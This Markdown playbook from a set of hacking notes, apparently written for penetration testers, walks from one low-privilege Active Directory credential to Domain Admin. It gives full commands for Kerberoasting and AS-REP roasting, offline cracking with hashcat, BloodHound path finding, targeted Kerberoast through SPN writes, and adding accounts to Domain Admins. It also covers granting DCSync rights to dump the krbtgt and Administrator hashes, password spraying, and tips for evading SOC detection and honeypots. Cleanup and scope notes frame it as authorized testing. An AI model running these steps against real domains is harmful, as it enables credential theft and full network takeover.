---
tags:
  - hack-notes
  - playbook
  - ad
---

# Kerberoasting to Domain Admin Playbook

> From one low-priv domain credential: enumerate SPN accounts, roast service tickets offline, crack a service account, then walk a BloodHound path from that account to Domain Admin.

> **Attack graph position**
> **Fed by:** One low-priv domain credential (entry); [Edge Device Exploit to Internal Foothold](Edge%20Device%20Exploit%20to%20Internal%20Foothold.md), [Azure AiTM Token Theft to Global Admin](Azure%20AiTM%20Token%20Theft%20to%20Global%20Admin.md) (cloud to on-prem bridge).
> **Feeds into:** [DCSync to Golden Ticket Persistence](DCSync%20to%20Golden%20Ticket%20Persistence.md)
> Full chain map: [Attack Graph](Attack%20Graph.md)

## Scenario at a Glance

| | |
|---|---|
| Goal | Escalate from a standard domain user to Domain Admin / Tier-0 |
| Starting position | One valid low-priv domain credential (or just network line-of-sight to the DC for the AS-REP fallback) |
| End state | Domain Admin, or DCSync rights equivalent to it |
| Key techniques | T1558.003 Kerberoasting, T1558.004 AS-REP Roasting, T1110.002 offline cracking, T1098/T1222 ACL abuse, T1003.006 DCSync |
| Prerequisites | At least one service account with an SPN and a weak password, OR a controllable object with write rights leading to DA; reachable KDC on 88/tcp and 389/tcp |
| Difficulty | Medium |
| Noise level | Quiet to Moderate (LDAP enum + 4769 ticket requests; cracking is invisible) |

## Attack Path

```
[low-priv domain creds]
        |
        v
  enumerate SPN accounts (GetUserSPNs / nxc --kerberoasting)
        |
   no SPN accounts crackable?  --> AS-REP roast (DONT_REQ_PREAUTH)  --> crack -m 18200
        |                                                                    |
        v                                                                    |
  request TGS-REP, dump hashes (RC4 etype 23 preferred)  <--------------------+
        |
        v
  hashcat -m 13100 + rockyou/rules  ->  cracked service account
        |
        +--- DEAD END: account has NO path to DA
        |           |
        |           v
        |     BloodHound: do we control an object with write rights?
        |           |  yes -> TARGETED KERBEROAST (write SPN onto victim, roast, crack, retry)
        |           |  no  -> pivot: spray cracked creds, re-roast as new identity, re-run BloodHound
        |
        +--- HAS PATH: BloodHound shortest-path to Domain Admins
                    |
                    v
        walk the ACL / nested-group / DCSync edge to DA
                    |
                    v
          [ Domain Admin / DCSync ]
```

## Prerequisites and Setup

- One valid domain credential: `corp.local\jdoe` / `Summer2026!`. (For the AS-REP-only fallback you need just a username list and a line to the DC.)
- Reachable DC: `DC01.corp.local` (`10.10.10.10`), ports 88 (Kerberos), 389/636 (LDAP/LDAPS), 445 (SMB).
- Toolbox on the attacker host (`attacker`, `10.10.14.5`):
  - Impacket (`GetUserSPNs.py`, `GetNPUsers.py`, `secretsdump.py`, `addcomputer.py`)
  - NetExec (`nxc`) and `targetedKerberoast.py` (ShutdownRepo)
  - BloodHound CE (Docker) + a collector: `rusthound-ce` (Linux) or `SharpHound.exe` (`-c All`) on a Windows foothold
  - `hashcat` with GPU, `rockyou.txt`, and a rules file (`OneRuleToRuleThemStill.rule`)
  - Rubeus on any Windows foothold for in-domain RC4-opsec roasting
- Fix clock skew before anything Kerberos: `sudo ntpdate DC01.corp.local` (or `faketime`). Kerberos rejects > 5 min skew with `KRB_AP_ERR_SKEW`.

## Walkthrough

### Step 1. Confirm the credential and lay of the domain

What and why: validate the cred works over LDAP, confirm the DC and domain FQDN, and bank a user/computer list for later. A bad cred or wrong FQDN wastes the whole chain.

```bash
# Validate cred and pull domain context
nxc ldap 10.10.10.10 -u jdoe -p 'Summer2026!'

# Bank users and computers for AS-REP fallback and for cracking context
nxc ldap 10.10.10.10 -u jdoe -p 'Summer2026!' --users | tee users_full.txt
awk '{print $1}' users_full.txt | grep -v '^$' > users.txt
```

Success signal: `[+] corp.local\jdoe:Summer2026!` and a populated user list. Note whether any accounts show `DONT_REQ_PREAUTH` (flags column) for Step 2b.

### Step 2. Enumerate SPN (Kerberoastable) accounts

What and why: every account with a `servicePrincipalName` can be roasted by any authenticated user. List them first so you target real service accounts (often weak, human-set passwords) rather than blasting blindly.

```bash
# Impacket: list SPN accounts without requesting tickets yet
GetUserSPNs.py corp.local/jdoe:'Summer2026!' -dc-ip 10.10.10.10

# NetExec equivalent (also writes hashes when you add the file arg in Step 3)
nxc ldap 10.10.10.10 -u jdoe -p 'Summer2026!' --kerberoasting /dev/null 2>&1 | grep sAMAccountName
```

Success signal: a table of `ServicePrincipalName / Name / MemberOf / PasswordLastSet`. Prioritize accounts whose `PasswordLastSet` is old (set by a human, rarely rotated) and that are members of privileged groups.

Decision / branch: if there are zero SPN accounts, or every one is AES-only with a strong password, jump to **Step 2b (AS-REP roast)** as the parallel/fallback path, and keep **Step 6 (targeted Kerberoast)** in reserve.

### Step 2b. AS-REP roast as parallel path / fallback (DONT_REQ_PREAUTH)

What and why: accounts with `DONT_REQ_PREAUTH` set hand out an AS-REP encrypted with the account's key to anyone, no credential needed. Run this in parallel with Kerberoasting; it is the only path when you have no creds at all.

```bash
# Authenticated: find ALL DONT_REQ_PREAUTH accounts and dump AS-REP hashes
GetNPUsers.py corp.local/jdoe:'Summer2026!' -dc-ip 10.10.10.10 -request -format hashcat -outputfile asrep.hash

# No creds: feed a username list (from OSINT / null-session enum)
GetNPUsers.py corp.local/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat -no-pass -outputfile asrep.hash

# NetExec equivalent
nxc ldap 10.10.10.10 -u jdoe -p 'Summer2026!' --asreproast asrep.hash
```

Crack with hashcat mode 18200:

```bash
hashcat -m 18200 -a 0 asrep.hash rockyou.txt -r OneRuleToRuleThemStill.rule
```

Success signal: hashes in `$krb5asrep$23$user@CORP.LOCAL:...` form, and a recovered plaintext. Feed any cracked cred back into Step 1 as a stronger identity and re-run BloodHound.

### Step 3. Request service tickets and dump roast hashes

What and why: request a TGS-REP for each SPN. The portion encrypted with the service account's NT hash is the crackable material. Prefer RC4 (etype 23) where the account allows it because RC4 cracks far faster than AES.

```bash
# Impacket: request all, RC4 where possible, write hashcat format
GetUserSPNs.py corp.local/jdoe:'Summer2026!' -dc-ip 10.10.10.10 -request -outputfile kerb.hash

# Single high-value target only (quieter, fewer 4769s)
GetUserSPNs.py corp.local/jdoe:'Summer2026!' -dc-ip 10.10.10.10 -request-user svc_sql -outputfile kerb_sql.hash

# NetExec one-liner: enumerate + request + write
nxc ldap 10.10.10.10 -u jdoe -p 'Summer2026!' --kerberoasting kerb.hash
```

In-domain from a Windows foothold, use Rubeus with OPSEC targeting (only roasts accounts that lack AES, so you never request RC4 for an AES account and stand out):

```powershell
# /rc4opsec uses tgtdeleg to find non-AES accounts and requests RC4 only for those
Rubeus.exe kerberoast /rc4opsec /nowrap /outfile:kerb.hash

# Throttle to blend in if the SOC is mature
Rubeus.exe kerberoast /rc4opsec /nowrap /delay:5000 /jitter:30 /outfile:kerb.hash
```

Success signal: hashes in `$krb5tgs$23$*svc_sql$CORP.LOCAL$...*` form (the `23` = RC4). `$krb5tgs$18$` means AES256, slower to crack (see Troubleshooting).

### Step 4. Crack offline with hashcat

What and why: cracking is entirely offline and invisible to the target. Run mode 13100 with a wordlist plus rules; service passwords are often `CompanyName123!` style and fall fast.

```bash
hashcat -m 13100 -a 0 kerb.hash rockyou.txt -r OneRuleToRuleThemStill.rule
# Show recovered passwords
hashcat -m 13100 kerb.hash --show
```

Success signal: `Status....: Cracked` and a `hash:password` line, e.g. `svc_sql:Welcome2026!`. Validate the recovered cred actually authenticates before trusting it:

```bash
nxc smb 10.10.10.10 -u svc_sql -p 'Welcome2026!'
```

Decision / branch: with a cracked account in hand, go to **Step 5** to ask BloodHound whether it reaches DA. If nothing cracks at all, return to **Step 6 (targeted Kerberoast)** or pivot (Variations).

### Step 5. Collect and query BloodHound for the path to DA

What and why: a cracked service account is only useful if it leads somewhere. BloodHound maps ACLs, group nesting, and DCSync rights so you walk a real edge instead of guessing. Collect as the cracked identity (it often sees more than `jdoe`).

```bash
# Linux collector (BloodHound CE), full collection, DC-only is quieter
rusthound-ce -d corp.local -u svc_sql -p 'Welcome2026!' -f DC01.corp.local -o bh_out -z
# Stealthier LDAP-only, DC-only:
rusthound-ce -d corp.local -u svc_sql -p 'Welcome2026!' -f DC01.corp.local --dc-only -z
```

From a Windows foothold use SharpHound CE (`-c All`; older v1 used `--collectionmethods`):

```powershell
SharpHound.exe -c All -d corp.local --zipfilename bh.zip
# Quiet variant: LDAP-only, no SMB session hunting
SharpHound.exe -c DCOnly -d corp.local --zipfilename bh.zip
```

Stand up BloodHound CE and ingest the zip:

```bash
curl -L https://raw.githubusercontent.com/SpecterOps/bloodhound/main/examples/docker-compose/docker-compose.yml -o docker-compose.yml
docker compose up -d   # UI on http://localhost:8080, drag the zip into the Explore upload
```

In the UI: mark the cracked account and any owned accounts as **Owned**, set **Domain Admins** as **High Value**, then run **Shortest Path to Domain Admins from Owned Principals**. Read the edge labels on the path.

Success signal: a rendered path. The edge into a privileged node tells you the exact escalation: `GenericAll`, `GenericWrite`, `WriteDacl`, `AddMember`, `ForceChangePassword`, `MemberOf`, or `GetChanges`/`GetChangesAll` (DCSync).

Decision / branch:
- Path exists -> **Step 7** (walk it).
- No path from the cracked account (dead end) -> **Step 6** (targeted Kerberoast a victim you can write to), or pivot per Variations.

### Step 6. Targeted Kerberoast (write an SPN onto a controllable account)

What and why: when the cracked or current account has `GenericAll` / `GenericWrite` / `WriteProperty` over another user (per BloodHound), temporarily write a fake SPN to that victim, roast it, crack it, then remove the SPN. This turns a write-edge into a fresh credential, often one that does reach DA.

```bash
# Automated: add temp SPN -> request TGS -> print hash -> delete SPN
python3 targetedKerberoast.py -v -d corp.local -u svc_sql -p 'Welcome2026!' \
  --request-user victimadmin --dc-ip 10.10.10.10 -o targeted.hash

# NetExec equivalent (adds/removes the SPN for you)
nxc ldap 10.10.10.10 -u svc_sql -p 'Welcome2026!' --targeted-kerberoast victimadmin
```

Manual fallback (if you want explicit control of the SPN write):

```bash
# Add SPN, roast, then ALWAYS remove it (cleanup in Step 9 / done by tools above)
bloodyAD -d corp.local -u svc_sql -p 'Welcome2026!' --host DC01.corp.local \
  set object victimadmin servicePrincipalName -v 'fake/svc'
GetUserSPNs.py corp.local/svc_sql:'Welcome2026!' -dc-ip 10.10.10.10 -request-user victimadmin -outputfile targeted.hash
bloodyAD -d corp.local -u svc_sql -p 'Welcome2026!' --host DC01.corp.local \
  remove object victimadmin servicePrincipalName -v 'fake/svc'
```

Crack `targeted.hash` with mode 13100 as in Step 4, then return to Step 5 and re-query BloodHound as the new identity.

Success signal: a `$krb5tgs$23$*victimadmin$...*` hash and a clean SPN removal afterward. Confirm the SPN is gone: `GetUserSPNs.py corp.local/jdoe:'Summer2026!' -dc-ip 10.10.10.10 | grep victimadmin` returns nothing.

### Step 7. Walk the BloodHound edge to Domain Admin

What and why: execute the specific escalation the path revealed. Pick the matching subsection. Stop at the proven primitive (DCSync or DA membership); do not go further than the engagement scope requires.

**7a. ForceChangePassword (reset a privileged user's password):**

```bash
net rpc password "victimadmin" "NewP@ss2026!" -U "corp.local"/"svc_sql"%"Welcome2026!" -S DC01.corp.local
# or
bloodyAD -d corp.local -u svc_sql -p 'Welcome2026!' --host DC01.corp.local set password victimadmin 'NewP@ss2026!'
```

**7b. GenericAll / GenericWrite over a user -> targeted Kerberoast (cracks the password without resetting it, less disruptive):** use Step 6 against that user.

**7c. AddMember (write to a group such as Domain Admins or an ACL-equivalent group):**

```bash
net rpc group addmem "Domain Admins" "svc_sql" -U "corp.local"/"svc_sql"%"Welcome2026!" -S DC01.corp.local
# or
bloodyAD -d corp.local -u svc_sql -p 'Welcome2026!' --host DC01.corp.local add groupMember "Domain Admins" svc_sql
```

**7d. WriteDacl over the domain object -> grant DCSync, then sync the krbtgt/Administrator hash:**

```bash
# Grant DCSync rights to the controlled account
dacledit.py -action write -rights DCSync -principal svc_sql \
  -target-dn 'DC=corp,DC=local' corp.local/svc_sql:'Welcome2026!' -dc-ip 10.10.10.10

# DCSync the domain (krbtgt for golden ticket, Administrator for direct logon)
secretsdump.py corp.local/svc_sql:'Welcome2026!'@10.10.10.10 -just-dc-user 'corp\Administrator'
secretsdump.py corp.local/svc_sql:'Welcome2026!'@10.10.10.10 -just-dc-user 'corp\krbtgt'
```

Success signal: 7a/7b yields a usable privileged cred; 7c shows the account in `Domain Admins` (`nxc smb 10.10.10.10 -u svc_sql -p ... | grep Pwn3d!`); 7d returns the `Administrator` and `krbtgt` NTLM hashes. Any of these is Domain Admin equivalent. Confirm with:

```bash
nxc smb 10.10.10.10 -u Administrator -H <recovered_admin_hash>   # expect (Pwn3d!)
```

## OPSEC and Detection

- **Event 4769 (Kerberos service ticket requested):** every TGS request logs a 4769 on the DC. The tells defenders hunt for: `Ticket Encryption Type 0x17` (RC4) when the account supports AES, a single account requesting many distinct service tickets in a short window, and tickets for SPNs that map to disabled/honeypot accounts. Reduce noise: request one or a few high-value SPNs (`-request-user`), use Rubeus `/rc4opsec` so you only downgrade accounts that genuinely lack AES, and add `/delay` + `/jitter`.
- **Honeypot / honeytoken SPN accounts:** mature shops plant a disabled account with an SPN and an old `PasswordLastSet`; any TGS request for it fires a high-fidelity alert. Cross-check BloodHound: a juicy-looking SPN account with no logon history, no group membership, and `enabled=false` is bait. Do not roast it.
- **Mass-SPN LDAP query detection:** `GetUserSPNs.py` and `nxc --kerberoasting` issue an LDAP filter for `servicePrincipalName=*`. EDR and AD threat tools flag that filter pattern. The DC-only / single-target approach and spacing out enumeration reduce the signature.
- **AS-REP roasting (Event 4768):** AS-REQ with no pre-auth from an unusual host is a strong signal; mode 18200 work itself is offline.
- **Cracking is invisible:** Steps 4 and the AS-REP crack generate zero target-side telemetry. The visible risk is entirely in the LDAP enum and the 4769/4768 events, so front-load stealth there.
- **DCSync (Event 4662) and group changes (4728/4732/4756, 5136):** the Step 7 escalations are loud. `4662` with the `DS-Replication-Get-Changes` GUID from a non-DC principal is a classic DCSync alert; `4720`/`4728` and `5136` on `Domain Admins` flag membership/ACL edits. Do these last, knowing they trip alarms.

## Cleanup

Revert every artifact you introduced, in reverse order of creation:

- **Targeted Kerberoast SPNs:** if you used `targetedKerberoast.py` or `nxc --targeted-kerberoast`, the temp SPN is auto-removed; verify with `GetUserSPNs.py ... | grep <victim>`. For any manual `set ... servicePrincipalName`, run the matching `remove object <victim> servicePrincipalName -v 'fake/svc'`.
- **Group memberships (7c):** `net rpc group delmem "Domain Admins" "svc_sql" -U corp.local/svc_sql%... -S DC01.corp.local` (or `bloodyAD ... remove groupMember`).
- **DCSync ACE (7d):** remove the ACE you added: `dacledit.py -action remove -rights DCSync -principal svc_sql -target-dn 'DC=corp,DC=local' corp.local/svc_sql:... -dc-ip 10.10.10.10`.
- **Password resets (7a):** you cannot restore the unknown original password; record the new password, flag it to the client for rotation, and note the disruption in the report. Prefer targeted Kerberoast over ForceChangePassword precisely to avoid this.
- **Any computer accounts** created for downstream abuse (`addcomputer.py`): delete them.
- **Local loot:** wipe `kerb.hash`, `asrep.hash`, `targeted.hash`, and the BloodHound zip/loot from the attacker box per engagement data-handling rules, or retain under the agreed evidence policy.

## Troubleshooting

- **Every roast hash is `$krb5tgs$18$` (AES256) and won't crack:** the account enforces AES (`msDS-SupportedEncryptionTypes` lacks RC4). You cannot force the DC to issue RC4 if the account truly lacks the key. Crack AES with mode 19700/19800 if the password is weak, otherwise move to a different SPN account or to targeted Kerberoasting against an account you control (which you can leave RC4-capable).
- **Nothing cracks (strong service passwords):** modern gMSA / managed service accounts use 120-char random passwords, uncrackable. Confirm via `objectClass=msDS-GroupManagedServiceAccount`; if so, abandon cracking and pivot to a write-edge (targeted Kerberoast a human-set account) or to a different vector entirely. Do not burn days on a gMSA hash.
- **`KRB_AP_ERR_SKEW` / clock skew too great:** sync to the DC: `sudo ntpdate DC01.corp.local` or wrap Impacket in `faketime "$(date)" GetUserSPNs.py ...`. Kerberos tolerance is 5 minutes.
- **`KDC_ERR_C_PRINCIPAL_UNKNOWN` on AS-REP:** the username does not exist or the realm casing is wrong. Use UPPERCASE realm and verify the user against `users.txt`.
- **`GetUserSPNs.py` returns accounts but `-request` yields no hash:** the account may be disabled or the SPN orphaned. Try a single `-request-user`, and treat a no-history disabled SPN account as a probable honeypot (skip it).
- **`-request` errors with RC4 but you need a ticket:** add the explicit etype, or fall back to Rubeus `/aes` to take AES tickets, then crack with the AES mode.
- **DCSync returns `RPC access denied`:** the ACE write did not apply or replication rights are missing. Re-check the `dacledit.py` write succeeded and that you targeted the domain root DN, not a sub-OU.

## Variations and Pivots

- **No creds at all:** start at Step 2b (AS-REP roast with a username list from OSINT / null session), crack, then re-enter the chain at Step 1 with the recovered identity.
- **Cracked account is a true dead end (no write edges, no path):** spray the cracked password across the domain (`nxc smb 10.10.10.10 -u users.txt -p 'Welcome2026!' --continue-on-success`) for password reuse, then re-collect BloodHound as any new identity. Service-account password reuse across hosts is common.
- **Path runs through a computer account / RBCD:** if BloodHound shows `GenericWrite` over a computer, pivot to Resource-Based Constrained Delegation instead of roasting (add a controlled machine to `msDS-AllowedToActOnBehalfOfOtherIdentity`).
- **Cracked krbtgt (via Step 7d DCSync):** forge a golden ticket for domain persistence (out of scope unless the engagement covers persistence; note it, do not deploy gratuitously).
- **Escalation from DA:** once at Domain Admin, the natural next chains are forest-wide compromise (trust abuse) and ADCS abuse if a CA is present.
- **Chain into:** [Internal Network and Active Directory](../Checklists/Internal%20Network%20and%20Active%20Directory.md) for the surrounding breadth methodology, and Ariadne to synthesize the BloodHound path into an operator-ready attack graph.

## Related

- [Internal Network and Active Directory](../Checklists/Internal%20Network%20and%20Active%20Directory.md)
- [Active Directory and Kerberos](../Cheatsheets/Active%20Directory%20and%20Kerberos.md)
- [NetExec and Impacket](../Cheatsheets/NetExec%20and%20Impacket.md)
- Ariadne
